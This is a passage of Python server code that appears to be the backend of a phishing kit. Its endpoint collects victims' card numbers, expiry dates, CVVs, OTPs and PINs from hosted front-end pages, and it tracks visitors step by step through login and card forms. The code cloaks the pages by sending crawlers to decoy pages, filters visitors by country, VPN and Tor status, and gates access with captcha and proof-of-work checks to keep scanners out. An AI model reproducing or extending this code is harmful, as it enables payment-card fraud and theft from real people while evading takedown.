            if not STORE.blacklist_add(ip, "manual", str(data.get("note", ""))):
                return self.json(400, {"error": "IP 格式不正确或已存在"})
            return self.json(200, {"ok": True})
        if path == "/api/blacklist/update":
            try:
                row_id = int(data.get("id", 0))
            except (TypeError, ValueError):
                return self.json(400, {"error": "request failed"})
            if not STORE.blacklist_update(row_id, str(data.get("ip", "")), str(data.get("note", ""))):
                return self.json(400, {"error": "更新失败：IP 格式不正确或记录不存在"})
            return self.json(200, {"ok": True})
        if path == "/api/blacklist/delete":
            try:
                row_id = int(data.get("id", 0))
            except (TypeError, ValueError):
                return self.json(400, {"error": "request failed"})
            return self.json(200, {"ok": STORE.blacklist_remove(row_id)})
        if path == "/api/blacklist/clear":
            return self.json(200, {"ok": True, "deleted": STORE.blacklist_clear()})
        if path == "/api/domains":
            return self.create_domain(data)
        if path == "/api/certificates":
            return self.issue_certificate(data)
        if path == "/api/projects/import":
            return self.import_project(data)
        if path == "/api/catalog/download":
            return self.download_catalog(data)
        if path == "/api/client/test-click":
            return self.client_test_click(data)
            return self.captcha_verify(data)
        match = re.fullmatch(r"/api/projects/(\d+)/update", path)
        if match:
            return self.update_project(int(match.group(1)))
        if path == "/api/settings":
            data = dict(data)
            if "redirect_links" in data:
                data["redirect_links"] = normalize_redirect_links(data["redirect_links"])
            if "client_redirect_rules" in data:
                data["client_redirect_rules"] = normalize_client_rules(data["client_redirect_rules"])
            STORE.save_settings(data)
            return self.json(200, {"ok": True})
        return self.json(404, {"error": "request failed"})

    def do_DELETE(self):
        parsed = urlparse(self.path)
        if not self.require_auth():
            return
        match = re.fullmatch(r"/api/domains/([^/]+)", parsed.path)
        if match:
            return self.delete_domain(unquote(match.group(1)))
        match = re.fullmatch(r"/api/projects/(\d+)", parsed.path)
        if match:
            if not STORE.delete_project(int(match.group(1))):
                return self.json(404, {"error": "request failed"})
            return self.json(200, {"ok": True})
        self.json(404, {"error": "request failed"})

    def get_captcha(self):
        cleanup_memory()
        left, right = secrets.randbelow(8) + 1, secrets.randbelow(8) + 1
        operation = secrets.choice(("+", "+", "-"))
        if operation == "-" and right > left:
            left, right = right, left
        answer = left + right if operation == "+" else left - right
        captcha_id = secrets.token_urlsafe(18)
        with MEMORY_LOCK:
            CAPTCHAS[captcha_id] = {"answer": str(answer), "expires": time.time() + CAPTCHA_TTL}
        self.json(200, {"id": captcha_id, "question": f"{left} {operation} {right} = ?"})

    def login(self, data):
        captcha_id = str(data.get("captcha_id", ""))
        with MEMORY_LOCK:
            captcha = CAPTCHAS.pop(captcha_id, None)
        if not captcha or captcha["expires"] < time.time() or not hmac.compare_digest(
            str(data.get("captcha", "")).strip(), captcha["answer"]
        ):
            return self.json(400, {"error": "request failed"})
        username = str(data.get("username", "")).strip()
        user = STORE.user(username)
        if not user or not verify_password(str(data.get("password", "")), user["password_hash"]):
            time.sleep(0.25)
            return self.json(401, {"error": "用户名或密码错误"})
        token = secrets.token_urlsafe(32)
        with MEMORY_LOCK:
            SESSIONS[token] = {"username": username, "expires": time.time() + SESSION_TTL}
        secure = "; Secure" if self.headers.get("X-Forwarded-Proto") == "https" else ""
        self.json(200, {"ok": True, "username": username}, {
            "Set-Cookie": f"gateway_session={token}; Path=/; Max-Age={SESSION_TTL}; HttpOnly; SameSite=Strict{secure}"
        })

    def track(self, event_type: str, source):
        domain = source.get("domain", [""])[0] if isinstance(source.get("domain"), list) else source.get("domain", "")
        domain = str(domain).lower().strip()
        if not DOMAIN_RE.match(domain):
            return self.json(400, {"error": "request failed"})
        path = source.get("path", [""])[0] if isinstance(source.get("path"), list) else source.get("path", "")
        client_type, _ = self.current_client()
        event_id = STORE.record_event(
            domain, event_type, self.client_ip(),
            self.headers.get("User-Agent", ""), str(path), client_type,
        )
        return self.json(201, {"ok": True, "id": event_id, "client_type": client_type}, {"Access-Control-Allow-Origin": "*"})

    def _request_domain(self) -> str:
        """当前请求归属的站点域名：Host 优先，预览路径兜底。"""
        host = self.headers.get("Host", "")
        domain = str((STORE.domain(host) or {}).get("domain") or "")
        if domain:
            return domain
        request_path = urlparse(self.path).path
        if request_path.startswith("/__preview/"):
            preview_host = unquote(request_path[len("/__preview/"):].split("/", 1)[0]).strip().lower()
            if preview_host and STORE.domain(preview_host):
                return preview_host
        return ""

    def client_visit(self, data):
        """访客落地：只登记一条 visitors（对齐原平台 /api/client/visit）。"""
        if not collect_rate_ok(self.client_ip()):
            return self.json(429, {"code": 429})
        if not isinstance(data, dict):
            return self.json(400, {"code": 400})
        domain = self._request_domain()
        site = str(data.get("site_code") or data.get("site_abbreviation") or "")[:128]
        uuid = str(data.get("uuid") or "").strip()[:64] or ("anon-" + self.client_ip())
        STORE.visitor_upsert(
            uuid=uuid, site=site, referer=domain or str(data.get("referer") or "")[:253],
            ip=self.client_ip(), ua=self.headers.get("User-Agent", ""),
            route=str(data.get("_route") or data.get("route") or "")[:512],
        )
        return self.json(200, {"code": 200, "msg": "ok"})

    def collect(self, data):
        """接收前台页面送来的提交（对齐原平台 /api/client/postData）。

        载荷：{uuid, site_code, action, _route, data:{字段...}, cardBIN}
        落库两块：
        - visitors：按 uuid 归并，data 里按步骤名（loginPage / cardPage / …）存 JSON
        - payments：认出的卡号 / 有效期 / CVV / OTP / PIN / 自定义码，带 BIN 识别结果
        另外保留一份原始快照进 captures，方便排查字段名对不上的站点。
        """
        ip = self.client_ip()
        if not collect_rate_ok(ip):
            return self.json(429, {"code": 429})
        if not isinstance(data, dict):
            return self.json(400, {"code": 400})
        raw_fields = data.get("data") if isinstance(data.get("data"), dict) else data.get("fields")
        clean_fields: dict[str, str] = {}
        if isinstance(raw_fields, dict):
            for key, value in raw_fields.items():
                if len(clean_fields) >= 60:
                    break
                name = str(key).strip()[:80]
                if not name:
                    continue
                if isinstance(value, (dict, list)):
                    value = json.dumps(value, ensure_ascii=False)
                clean_fields[name] = str(value)[:512]
        href = str(data.get("href") or "")[:1024]
        if not clean_fields and not href:
            return self.json(400, {"code": 400})
        domain = self._request_domain()
        if not domain:
            guess = str(data.get("domain") or "").strip().lower()
            if guess and STORE.domain(guess):
                domain = guess
        site = str(data.get("site_code") or data.get("site_abbreviation") or "")[:128]
        uuid = str(data.get("uuid") or "").strip()[:64] or ("anon-" + ip)
        action = str(data.get("action") or data.get("kind") or "page")[:64]
        route = str(data.get("_route") or data.get("path") or "")[:512]
        client_type, _ = self.current_client()
        try:
            step = max(0, min(99, int(str(data.get("step") or "0"))))
        except (TypeError, ValueError):
            step = 0

        # 1) 访客主记录
        visitor_id = STORE.visitor_upsert(
            uuid=uuid, site=site, referer=domain or str(data.get("referer") or "")[:253],
            ip=ip, ua=self.headers.get("User-Agent", ""), action=action, route=route,
            steps=clean_fields or None, card_bin=str(data.get("cardBIN") or "")[:16],
        )

        # 2) 卡料识别
        card_values = extract_card_values(clean_fields)
        payment_id = 0
        if card_values.get("ccard"):
            card_values.update(STORE.bin_lookup(card_values["ccard"]))
            payment_id = STORE.payment_add(
                uid=visitor_id, uuid=uuid, site=site, values=card_values,
                referer=domain or str(data.get("referer") or "")[:253], ip=ip,
            )
        elif card_values:
            latest = STORE.payment_latest(uuid)
            if latest:
                STORE.payment_update(latest["id"], card_values)
                payment_id = latest["id"]

        # 3) 原始快照（排查用）
        capture_id = STORE.add_capture(
            domain=domain or "unknown",
            path=route,
            href=href,
            step=step,
            fields_json=json.dumps(clean_fields, ensure_ascii=False),
            ip=ip,
            ua=self.headers.get("User-Agent", ""),
            client_type=client_type,
            language=str(data.get("lang") or "")[:64],
            timezone=str(data.get("tz") or "")[:64],
            screen=str(data.get("screen") or "")[:32],
            referer=str(data.get("referer") or "")[:1024],
            kind=action,
        )
        return self.json(200, {
            "code": 200, "msg": "ok", "id": capture_id,
            "visitor_id": visitor_id, "payment_id": payment_id,
        })

    def issue_verified_cookie(self, domain: str):
        """Sign a short-lived verification receipt bound to this domain."""
        return self.issue_signed_cookie(CAPTCHA_COOKIE, {"d": domain, "t": int(time.time())})

    def issue_signed_cookie(self, name: str, payload: dict) -> str:
        """Sign an arbitrary receipt so one verifier can serve several cookies."""
        body = base64.urlsafe_b64encode(
            json.dumps(payload).encode()).decode().rstrip("=")
        signature = hmac.new(CAPTCHA_SECRET, body.encode(), hashlib.sha256).hexdigest()[:32]
        return f"{body}.{signature}"

    def read_signed_cookie(self, name: str) -> dict:
        """Return the decoded payload of a signed cookie, or {} when invalid."""
        raw = self.cookie_value(name)
        if not raw:
            return {}
        body, _, signature = raw.rpartition(".")
        if not body or not signature:
            return {}
        expected = hmac.new(CAPTCHA_SECRET, body.encode(), hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(signature, expected):
            return {}
        try:
            padded = body + "=" * (-len(body) % 4)
            return json.loads(base64.urlsafe_b64decode(padded.encode()).decode())
        except (ValueError, TypeError):
            return {}

    def verification_valid(self, domain: str) -> bool:
        """Check the receipt: signature, domain match and freshness."""
        payload = self.read_signed_cookie(CAPTCHA_COOKIE)
        if not payload:
            return False
        if payload.get("d") != domain:
            return False
        return int(time.time()) - int(payload.get("t", 0)) <= self.captcha_ttl()

    def flow_valid(self, domain: str) -> bool:
        """Check the login receipt issued by /flow/login."""
        payload = self.read_signed_cookie(FLOW_COOKIE)
        if not payload or payload.get("d") != domain:
            return False
        return int(time.time()) - int(payload.get("t", 0)) <= self.captcha_ttl()

    def captcha_ttl(self) -> int:
        raw = int(STORE.get_settings().get("captcha_ttl_seconds") or CAPTCHA_TTL_DEFAULT)
        return min(max(raw, 300), 30 * 24 * 3600)

    def captcha_max_tries(self) -> int:
        raw = int(STORE.get_settings().get("captcha_max_tries") or CAPTCHA_MAX_TRIES_DEFAULT)
        return min(max(raw, 1), 10)

    def cookie_value(self, name: str) -> str:
        raw = self.headers.get("Cookie", "")
        for part in raw.split(";"):
            key, _, value = part.strip().partition("=")
            if key == name:
                return unquote(value)
        return ""

    def verification_bypassed(self, domain: dict) -> bool:
        """Decide whether this document request may skip human verification.

        Only real browser clients are gated: crawlers keep flowing through the
        crawler guard so they still land on the decoy page instead of a captcha
        they cannot solve. Static assets never reach this method.
        """
        settings = STORE.get_settings()
        if not settings.get("captcha_enabled"):
            return True
        client_type, _ = self.current_client()
        if client_type == CLIENT_BOT:
            return True
        return self.verification_valid(domain["domain"])

    def flow_page_blocked(self, domain: dict, relative: str) -> bool:
        """Return True when a guarded page is opened without the login receipt.

        This is what stops "verify once, then jump straight to step 3": the
        update page and the QR page are only reachable after /flow/login.
        Only active while human verification is on — with it disabled nobody
        ever earns the receipt, so gating would lock the site shut.
        """
        if not STORE.get_settings().get("captcha_enabled"):
            return False
        name = relative.rsplit("/", 1)[-1]
        if name not in FLOW_GUARDED_PAGES:
            return False
        return not self.flow_valid(domain["domain"])

    def flow_login(self):
        """Issue the login receipt that unlocks the pages behind the login form.

        The login page calls this over fetch before navigating on, so the step
        order is enforced by the server rather than by the page's own links.
        """
        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
            STORE.domain(self._preview_host) if self._preview_host else None
        )
        if not domain_row:
            return self.send_error(404)
        if not self.verification_valid(domain_row["domain"]):
            return self.json(403, {"ok": False, "error": "VERIFICATION_REQUIRED"})
        cookie = self.issue_signed_cookie(
            FLOW_COOKIE, {"d": domain_row["domain"], "t": int(time.time())})
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header(
            "Set-Cookie",
            f"{FLOW_COOKIE}={cookie}; Path=/; Max-Age={self.captcha_ttl()}; "
            "HttpOnly; SameSite=Lax",
        )
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    def redirect_to_entry(self):
        """Send the visitor back to the entry page to resume the flow.

        In local preview mode the entry lives under the /__preview/<domain>/
        namespace, so the target has to carry that prefix.
        """
        target = (self.verification_prefix() or "") + "/"
        self.send_response(302)
        self.send_header("Location", target)
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Gateway-Flow", "restart")
        self.end_headers()

    def verification_prefix(self) -> str:
        """URL prefix for the verification endpoints (empty in normal serving)."""
        return f"/__preview/{self._preview_host}" if self._preview_host else ""

    def captcha_page(self, domain: dict):
        """Render the verification interstitial for this domain."""
        challenge = new_captcha_challenge(self.client_ip())
        project = STORE.project(domain.get("project_id")) if domain.get("project_id") else None
        slug = (project or {}).get("slug", "")
        prefix = self.verification_prefix()
        page = build_captcha_page(
            challenge, slug, tries_left=self.captcha_max_tries(),
            verify_url=prefix + "/captcha/verify",
            go_url=prefix + "/captcha/go/", prefix=prefix,
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(page)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Gateway-Verify", "required")
        self.end_headers()
        self.wfile.write(page)

    def captcha_verify(self, data):
        """Validate the clicked positions and hand back a one-shot token."""
        challenge_id = str(data.get("captchaId", ""))
        token = str(data.get("token", ""))
        positions = data.get("clickedPositions")
        if not verify_captcha_signature(token) or token.split(".")[0] != challenge_id:
            return self.json(400, {"success": False, "error": "INVALID_TOKEN",
                                   "message": "確認セッションが無効です。ページを再読み込みしてください。"})
        challenge = get_captcha_challenge(challenge_id)
        if not challenge:
            return self.json(410, {"success": False, "error": "CAPTCHA_EXPIRED",
                                   "message": "確認の有効期限が切れました。ページを再読み込みしてください。"})
        client_ip = self.client_ip()
        # 防线1：挑战与提交者 IP 绑定（打码农场/跨机提交直接失效）
        if challenge.get("ip") != client_ip:
            return self.json(403, {"success": False, "error": "IP_MISMATCH",
                                   "message": "確認セッションが無効です。ページを再読み込みしてください。"})
        # 防线3：最短提交间隔（页面渲染后 2 秒内提交 = 脚本特征）
        if time.time() - challenge.get("created_at", 0) < CAPTCHA_MIN_SUBMIT_SECONDS:
            return self.json(429, {"success": False, "error": "TOO_FAST",
                                   "message": "操作が速すぎます。もう一度お試しください。"})
        # 防线4：工作量证明（页面 JS 后台预计算，真人无感；纯 HTTP 脚本无法提交）
        if not solve_captcha_pow(challenge.get("pow", ""), str(data.get("powNonce", ""))):
            rotated = secrets.token_hex(8)
            with CAPTCHA_LOCK:
                challenge["pow"] = rotated
            return self.json(400, {"success": False, "error": "POW_REQUIRED",
                                   "powChallenge": rotated,
                                   "message": "確認を開始できませんでした。ページを再読み込みしてください。"})
        # 防线2：IP 级失败冷却（失败越多等待越长，成功后清零）
        cooldown = captcha_cooldown_remaining(client_ip)
        if cooldown > 0:
            return self.json(429, {"success": False, "error": "COOLDOWN", "retryAfter": cooldown,
                                   "message": f"試行回数が多いため、あと {cooldown} 秒お待ちください。"})
        if not isinstance(positions, list) or not all(isinstance(item, int) for item in positions):
            return self.json(400, {"success": False, "error": "INVALID_SELECTION",
                                   "message": "選択内容が正しくありません。"})
        max_tries = self.captcha_max_tries()
        if sorted(set(positions)) != challenge["answer"]:
            with CAPTCHA_LOCK:
                challenge["tries"] += 1
                tries = challenge["tries"]
                if tries >= max_tries:
                    CAPTCHA_CHALLENGES.pop(challenge_id, None)
            captcha_register_fail(client_ip)
            rotated = secrets.token_hex(8)
            with CAPTCHA_LOCK:
                challenge["pow"] = rotated
            retry_after = captcha_cooldown_remaining(client_ip)
            if tries >= max_tries:
                return self.json(429, {
                    "success": False, "error": "MAX_ATTEMPTS_EXCEEDED", "triesLeft": 0,
                    "powChallenge": rotated,
                    "message": "確認に失敗した回数が上限に達しました。しばらくしてからもう一度お試しください。",
                })
            return self.json(200, {
                "success": False, "error": "VERIFICATION_FAILED", "triesLeft": max_tries - tries,
                "powChallenge": rotated, "retryAfter": retry_after,
                "message": "選択が正しくありません。盾のアイコンだけをすべて選び直してください。",
            })
        redirect_token = secrets.token_urlsafe(18)
        captcha_clear_fails(client_ip)
        with CAPTCHA_LOCK:
            CAPTCHA_CHALLENGES.pop(challenge_id, None)
            REDIRECTS[redirect_token] = {
                "domain": self.verification_domain or "",
                "created_at": time.time(), "used": False,
            }
            prune_redirects()
        return self.json(200, {
            "success": True, "redirectToken": redirect_token,
            "message": "確認が完了しました。転送しています...",
        })

    def captcha_go(self, token: str):
        """Consume the one-shot token and set the verification cookie."""
        with CAPTCHA_LOCK:
            entry = REDIRECTS.get(token)
            if not entry or entry.get("used"):
                entry = None
            else:
                entry["used"] = True
            prune_redirects()
        if not entry:
            return self.json(410, {"success": False, "error": "TOKEN_INVALID",
                                   "message": "確認結果の有効期限が切れました。もう一度お試しください。"})
        cookie = self.issue_verified_cookie(entry["domain"])
        self.send_response(302)
        self.send_header("Location", "/")
        self.send_header(
            "Set-Cookie",
            f"{CAPTCHA_COOKIE}={cookie}; Path=/; Max-Age={self.captcha_ttl()}; HttpOnly; SameSite=Lax",
        )
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def client_probe_page(self, domain: dict):
        """Render the invisible timezone probe and hand out a one-shot token."""
        token = new_env_challenge(self.client_ip())
        prefix = self.verification_prefix()
        page = build_client_probe_page(prefix, token)
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(page)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(page)

    def client_env_report(self, data):
        """Receive the probe result, sign it server-side, issue env cookie."""
        token = str(data.get("token", ""))
        tz = str(data.get("tz", "")).strip()[:64]
        langs = str(data.get("langs", "")).strip()[:200]
        ip = self.client_ip()
        with ENV_LOCK:
            entry = ENV_CHALLENGES.pop(token, None)
        if not entry or entry.get("ip") != ip or time.time() - entry["created_at"] > ENV_CHALLENGE_TTL:
            return self.json(400, {"ok": False, "error": "TOKEN_INVALID"})
        if not tz:
            return self.json(400, {"ok": False, "error": "NO_TZ"})
        cookie = self.issue_signed_cookie(ENV_COOKIE, {"tz": tz, "ls": langs, "t": int(time.time())})
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header(
            "Set-Cookie",
            f"{ENV_COOKIE}={cookie}; Path=/; Max-Age={self.captcha_ttl()}; HttpOnly; SameSite=Lax",
        )
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    def route_captcha(self, path: str, query: dict):
        """Dispatch the verification endpoints and their static images."""
        if path in ("/captcha/security.png", "/captcha/captcha-decoy.png"):
            return self.serve_captcha_asset(path.rsplit("/", 1)[-1])
        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
            STORE.domain(self._preview_host) if self._preview_host else None
        )
        if not domain_row:
            return self.send_error(404)
        self.verification_domain = domain_row["domain"]
        if path in ("/captcha", "/captcha/"):
            return self.captcha_page(domain_row)
        match = re.fullmatch(r"/captcha/go/([A-Za-z0-9_-]{8,64})", path)
        if match:
            return self.captcha_go(match.group(1))
        return self.send_error(404)

    def serve_captcha_asset(self, name: str):
        file_path = (CAPTCHA_CELLS_DIR / name).resolve()
        if CAPTCHA_CELLS_DIR.resolve() not in file_path.parents or not file_path.is_file():
            return self.send_error(404)
        try:
            content = file_path.read_bytes()
        except OSError:
            return self.send_error(404)
        self.send_response(200)
        self.send_header("Content-Type", mimetypes.guess_type(str(file_path))[0] or "image/png")
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Cache-Control", "public, max-age=86400")
        self.end_headers()
        self.wfile.write(content)



    def current_client(self):
        """Detect the visitor's client type from the request User-Agent."""
        return classify_client(self.headers.get("User-Agent", ""))

    def pre_gate_redirect_target(self) -> str:
        """前置机器人层（黑名单/频率/爬虫/设备/语言/时区）不通过的统一跳转地址。

        优先「爬虫跳转地址」，未配置回落「拦截后跳转地址」，再无则空（调用方 403）。
        """
        settings = STORE.get_settings()
        if settings.get("bot_redirect_enabled"):
            url = str(settings.get("bot_redirect_url", "")).strip()
            if urlparse(url).scheme in ("http", "https"):
                return url
        url = str(settings.get("redirect_url", "")).strip()
        if urlparse(url).scheme in ("http", "https"):
            return url
        return ""

    def guard_decision(self):
        # 黑名单 IP 直接短路：不查 IPRegistry、不算语言，省配额且零延迟拒绝
        ip_now = self.client_ip()
        STORE.ensure_blacklist_cache()
        if ip_now in BLACKLIST_CACHE:
            return {
                "allowed": False, "reasons": ["blacklist"], "redirect_url": "",
                "human_verification": False, "country": None, "registry_error": "",
                "client_type": CLIENT_BLACKLIST, "client_label": CLIENT_LABELS[CLIENT_BLACKLIST],
                "client_reasons": ["in_blacklist"], "is_bot": False,
            }
        settings = STORE.get_settings()
        ua = self.headers.get("User-Agent", "").lower()
        client_type, client_reasons = self.current_client()
        reasons = []
        is_android = "android" in ua
        is_ios = bool(re.search(r"iphone|ipad|ipod", ua) or ("macintosh" in ua and "mobile" in ua))
        is_mobile = is_android or is_ios or "mobile" in ua
        if settings.get("block_desktop") and not is_mobile:
            reasons.append("desktop")
        if settings.get("block_ios") and is_ios:
            reasons.append("ios")
        if settings.get("block_android") and is_android:
            reasons.append("android")

        is_bot = client_type == CLIENT_BOT
        if is_bot and not reasons:
            reasons.append("bot")

        # 浏览器语言拦截：仅放行白名单语言（依据 Accept-Language，服务端可判）
        if bool(settings.get("browser_lang_check")) and not reasons:
            lang_wl = {str(x).strip().lower() for x in (settings.get("browser_lang_whitelist") or [])
                       if str(x).strip()}
            if lang_wl:
                offered = parse_accept_languages(self.headers.get("Accept-Language", ""))
                if not any(tag in lang_wl or tag.split("-")[0] in lang_wl for tag in offered):
                    reasons.append("browser_lang")

        registry = None
        registry_error = ""
        key = str(settings.get("ipregistry_api_key", "")).strip()
        whitelist = {item for item in re.split(r"[\s,]+", str(settings.get("country_whitelist", "")).upper()) if item}
        blacklist = {item for item in re.split(r"[\s,]+", str(settings.get("country_blacklist", "")).upper()) if item}
        security_enabled = bool(settings.get("ipregistry_enabled"))
        selected_ip_types = set(settings.get("blocked_ip_types", []) or [])
        selected_threats = set(settings.get("blocked_threats", []) or [])
        needs_registry = bool(whitelist or blacklist or (security_enabled and (selected_ip_types or selected_threats)))
        if not reasons and needs_registry:
            if not key:
                registry_error = "IPRegistry API Key 未配置"
            else:
                ip = self.client_ip()
                url = f"https://api.ipregistry.co/{ip}?key={key}"
                try:
                    request = urllib.request.Request(url, headers={"Accept": "application/json", "User-Agent": "GatewayConsole/1.0"})
                    with urllib.request.urlopen(request, timeout=6) as response:
                        registry = json.loads(response.read().decode("utf-8"))
                    country = str(registry.get("location", {}).get("country", {}).get("code", "")).upper()
                    if whitelist and country not in whitelist:
                        reasons.append("country_not_allowed")
                    if country and country in blacklist:
                        reasons.append("country_blocked")
                    if security_enabled:
                        security = registry.get("security", {}) or {}
                        type_fields = {"proxy": "is_proxy", "vpn": "is_vpn", "anonymous": "is_anonymous", "relay": "is_relay", "cloud": "is_cloud_provider"}
                        threat_fields = {"threat": "is_threat", "abuser": "is_abuser", "attacker": "is_attacker", "bogon": "is_bogon", "tor": "is_tor"}
                        for selected, fields, prefix in (
                            (selected_ip_types, type_fields, "network"),
                            (selected_threats, threat_fields, "threat"),
                        ):
                            for name in selected or []:
                                if security.get(fields.get(name, "")) is True:
                                    reasons.append(f"{prefix}:{name}")
                except (urllib.error.URLError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
                    registry_error = str(exc)

        return {
            "allowed": not reasons and not registry_error,
            "reasons": reasons + (["ipregistry_unavailable"] if registry_error else []),
            "redirect_url": str(settings.get("redirect_url", "")).strip(),
            "human_verification": bool(settings.get("human_verification")) and not reasons,
            "country": registry and registry.get("location", {}).get("country", {}).get("code", ""),
            "registry_error": registry_error,
            "client_type": client_type,
            "client_label": CLIENT_LABELS[client_type],
            "client_reasons": client_reasons,
            "is_bot": is_bot,
        }

    def guard_check(self, query):
        decision = self.guard_decision()
        if decision["registry_error"]:
            return self.json(502, {"error": "IPRegistry 检测暂时不可用", "detail": decision["registry_error"]}, {"Access-Control-Allow-Origin": "*"})
        decision.pop("registry_error", None)
        return self.json(200, decision, {"Access-Control-Allow-Origin": "*"})

    def ipregistry_status(self):
        key = str(STORE.get_settings().get("ipregistry_api_key", "")).strip()
        if not key:
            return self.json(200, {"configured": False, "remaining": None})

        request = urllib.request.Request(
            f"https://api.ipregistry.co/?key={quote(key, safe='')}",
            headers={"Accept": "application/json", "User-Agent": "GatewayConsole/1.0"},
        )
        try:
            with urllib.request.urlopen(request, timeout=8) as response:
                remaining = response.headers.get("Ipregistry-Credits-Remaining")
                consumed = response.headers.get("Ipregistry-Credits-Consumed")
                if remaining is None:
                    payload = json.loads(response.read().decode("utf-8"))
                    if isinstance(payload, dict):
                        remaining = (
                            payload.get("credits", {}).get("remaining")
                            if isinstance(payload.get("credits"), dict)
                            else payload.get("credits_remaining")
                        )
        except urllib.error.HTTPError as exc:
            message = "API Key 无效或 IPRegistry 拒绝了查询"
            if exc.code == 429:
                message = "IPRegistry 查询过于频繁，请稍后重试"
            return self.json(502, {"error": message})
        except (urllib.error.URLError, TimeoutError, ValueError, json.JSONDecodeError):
            return self.json(502, {"error": "IPRegistry 积分查询暂时不可用"})

        try:
            remaining = int(str(remaining))
        except (TypeError, ValueError):
            return self.json(502, {"error": "IPRegistry 未返回剩余积分"})
        try:
            consumed = int(str(consumed)) if consumed is not None else None
        except (TypeError, ValueError):
            consumed = None
        return self.json(200, {"configured": True, "remaining": remaining, "consumed": consumed})

    def pick_click_target(self, domain: dict, client_type: str):
        """Resolve the click destination for this visitor.

        Order: per-client rule pool -> global rotation pool -> global redirect_url.
        Crawlers never reach the real page, so they fall back to the dedicated
        bot URL (a decoy page) when configured.
        """
        settings = STORE.get_settings()
        is_bot = client_type == CLIENT_BOT

        if is_bot and settings.get("bot_redirect_enabled"):
            bot_url = str(settings.get("bot_redirect_url", "")).strip()
            if urlparse(bot_url).scheme in ("http", "https"):
                return bot_url, "bot_rule"

        if settings.get("client_redirect_enabled") and not is_bot:
            rules = normalize_client_rules(settings.get("client_redirect_rules", {}))
            candidates = [rules.get(client_type, {})]
            if client_type in (CLIENT_IOS, CLIENT_ANDROID):
                candidates.append(rules.get(CLIENT_UNKNOWN, {}))
            for rule in candidates:
                pool = [rule] if rule and rule.get("url") else []
                if pool:
                    target = STORE.next_client_redirect(client_type, pool)
                    if target:
                        return target, f"client_rule:{client_type}"

        target = STORE.next_redirect(normalize_redirect_links(settings.get("redirect_links", [])))
        if target:
            return target, "rotation_pool"
        fallback = str(settings.get("redirect_url", "")).strip()
        if fallback and urlparse(fallback).scheme in ("http", "https"):
            return fallback, "redirect_url"
        return None, "none"

    def detect_client_payload(self, ua: str):
        """Preview classification + the URL a given UA would be routed to.

        Used by the admin "test" buttons so operators can see the outcome
        without issuing a real click that burns a rotation slot.
        """
        client_type, client_reasons = classify_client(ua)
        target, rule = self.pick_click_target({}, client_type)
        return {
            "ua": str(ua or ""),
            "client_type": client_type,
            "client_label": CLIENT_LABELS[client_type],
            "client_reasons": client_reasons,
            "is_bot": client_type == CLIENT_BOT,
            "target_url": target or "",
            "matched_rule": rule,
        }

    def client_test_click(self, data):
        """Perform a real routing decision for a pasted UA and 302 to the result."""
        ua = str(data.get("ua", "")).strip()
        if not ua:
            return self.json(400, {"error": "请填写要测试的 User-Agent"})
        client_type, client_reasons = classify_client(ua)
        target, rule = self.pick_click_target({}, client_type)
        if not target:
            return self.json(404, {
                "error": "尚未配置任何跳转链接",
                "client_type": client_type,
                "client_label": CLIENT_LABELS[client_type],
                "client_reasons": client_reasons,
            })
        self.send_response(302)
        self.send_header("Location", target)
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Gateway-Client", client_type)
        self.send_header("X-Gateway-Rule", rule)
        self.end_headers()

    def public_click(self):
        """Resolve the destination for this visitor's click and redirect there.

        A visitor with no matching rule is not an error: the pool may have been
        emptied after the page was rendered, or their client simply has no rule.
        Returning the raw 404 error page broke the whole funnel (they landed on
        "Error code: 404" instead of continuing), so fall back to the site root
        and let the flow carry on.
        """
        lookup_host = self._preview_host or self.headers.get("Host", "")
        domain = STORE.domain(lookup_host)
        if not domain:
            return self.send_error(404)
        # 黑名单 IP 的点击同样直接拦截跳转（不进入分流，不消耗配额）
        STORE.ensure_blacklist_cache()
        if self.client_ip() in BLACKLIST_CACHE:
            STORE.record_event(domain["domain"], "rejected", self.client_ip(),
                               self.headers.get("User-Agent", ""), "/__gateway/click", CLIENT_BLACKLIST)
            target = self.pre_gate_redirect_target()
            if target:
                self.send_response(302)
                self.send_header("Location", target)
                self.send_header("Cache-Control", "no-store")
                self.send_header("X-Gateway-Block", "blacklist")
                self.end_headers()
            else:
                self.send_error(403)
            return
        client_type, _ = self.current_client()
        target, rule = self.pick_click_target(domain, client_type)
        if not target or urlparse(target).scheme not in ("http", "https"):
            # No destination for this client: send them back to the entry page
            # instead of an error document. `rule` records why nothing matched.
            entry = str(domain.get("frontend_entry") or "index.html").lstrip("/")
            fallback = (self.verification_prefix() or "") + "/" + entry
            self.send_response(302)
            self.send_header("Location", fallback)
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Gateway-Client", client_type)
            self.send_header("X-Gateway-Rule", f"{rule}:fallback_entry")
            self.end_headers()
            return
        STORE.record_event(
            domain["domain"], "click", self.client_ip(),
            self.headers.get("User-Agent", ""), target, client_type,
        )
        self.send_response(302)
        self.send_header("Location", target)
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Gateway-Client", client_type)
        self.send_header("X-Gateway-Rule", rule)
        self.end_headers()

    def serve_public(self, path: str, domain: dict):
        project = STORE.project(domain.get("project_id")) if domain.get("project_id") else None
        if not project or not project.get("local_path"):
            return self.send_error(404)
        root = Path(project["local_path"]).resolve()
        # 重建产物优先：170 个前台的多页面静态版放在 rebuild/<slug>/，
        # 体积大的 assets 不重复上传，缺文件时回落到 sources/<slug>/（前缀已由上面剥掉）。
        _slug = str(project.get("slug") or "")
        rebuild_root = (REBUILD_DIR / _slug).resolve() if _slug else None
